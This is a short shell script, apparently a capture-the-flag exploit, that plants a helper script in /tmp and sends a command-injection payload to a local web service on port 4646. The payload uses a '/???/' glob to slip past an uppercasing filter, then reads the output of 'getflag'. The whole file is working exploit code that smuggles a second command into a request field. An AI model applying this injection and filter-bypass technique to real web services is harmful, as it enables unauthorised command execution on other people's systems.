#!/bin/sh
# sh pwn.sh  -> injection with no lowercase and no spaces (see walkthrough.md)
rm -f /tmp/l12 /tmp/0000
printf '#!/bin/sh\ngetflag > /tmp/l12 2>&1\nchmod 666 /tmp/l12\n' > /tmp/0000   # lowercase hides in here
chmod +x /tmp/0000
curl -s -G http://localhost:4646/ --data-urlencode 'x=$(/???/0000)' >/dev/null   # /??? = /tmp, dodges the uppercasing
sleep 1
cat /tmp/l12
